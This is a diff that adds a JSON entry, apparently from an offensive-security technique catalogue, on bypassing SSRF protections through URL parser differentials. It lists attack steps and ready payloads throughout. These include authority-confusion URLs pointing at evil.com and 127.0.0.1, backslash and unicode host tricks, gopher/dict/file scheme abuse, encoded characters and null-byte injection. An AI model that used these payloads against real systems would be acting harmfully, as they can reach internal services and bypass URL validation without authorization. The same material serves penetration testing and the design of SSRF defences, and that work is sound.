@@ -1,0 +1,59 @@
+{
+  "id": "ssrf-url-parser-differential",
+  "title": "SSRF via URL Parser Differentials",
+  "category": "ssrf",
+  "tags": ["url-parsing", "ssrf", "bypass", "parser-differential"],
+  "applicability": {
+    "technologies": ["node", "python", "java", "go", "ruby", "php"],
+    "contexts": ["url-parameter", "webhook-url", "redirect-url"],
+    "preconditions": ["server-side-request", "url-validation"]
+  },
+  "technique": {
+    "summary": "Exploit inconsistencies between URL parsers (the one used for validation vs. the one used for fetching) to bypass SSRF protections. Different libraries parse authority, host, port, and path components differently.",
+    "steps": [
+      "Identify the SSRF protection mechanism (allowlist, blocklist, regex)",
+      "Test various URL authority formats: user@host, host\\@attacker, host#fragment",
+      "Test backslash vs forward slash handling: http://attacker\\@target",
+      "Test Unicode normalization: fullwidth characters, homoglyphs",
+      "Test port-based bypasses: http://target:80@attacker",
+      "Test scheme handling: gopher://, dict://, file:///",
+      "Confirm which parser handles validation vs. actual request"
+    ],
+    "payloads": [
+      {
+        "payload": "http://evil.com#@target.com/",
+        "encoding": "raw",
+        "context": "url-parameter",
+        "notes": "Fragment-based authority confusion"
+      },
+      {
+        "payload": "http://target.com@evil.com/",
+        "encoding": "raw",
+        "context": "url-parameter",
+        "notes": "Authority confusion — validator sees target.com, fetcher resolves evil.com"
+      },
+      {
+        "payload": "http://127.0.0.1:80\\@allowed-host.com/",
+        "encoding": "raw",
+        "context": "url-parameter",
+        "notes": "Backslash authority confusion"
+      },
+      {
+        "payload": "http://ⓔⓥⓘⓛ.com",
+        "encoding": "unicode",
+        "context": "url-parameter",
+        "notes": "Unicode fullwidth characters — may normalize to evil.com"
+      }
+    ],
+    "bypassTechniques": [
+      "Combine with URL encoding: http://127.0.0.1%2523@allowed",
+      "Use different URL schemes (gopher, dict, file) if supported",
+      "Chain with open redirect on allowed domain",
+      "Null byte injection in URL: http://allowed.com%00.evil.com"
+    ]
+  },
+  "references": [
+    "https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf"
+  ],
+  "source": "blackhat-research"
+}
